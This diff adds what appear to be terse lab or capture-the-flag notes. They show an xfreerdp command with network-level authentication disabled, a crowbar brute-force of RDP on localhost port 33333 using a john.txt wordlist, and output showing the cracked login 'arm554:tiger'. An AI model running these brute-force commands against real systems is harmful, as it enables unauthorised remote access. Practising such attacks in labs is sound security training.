@@ -1,0 +1,7 @@
+#xfreerdp /v:127.0.0.1 /port:33333 -sec-nla /u:""
+arm554
+
+crowbar -s 127.0.0.1/32 -u arm554 -C john.txt -p 33333 -b rdp -v
+RDP-SUCCESS : 127.0.0.1:33333 - arm554:tiger
+
+
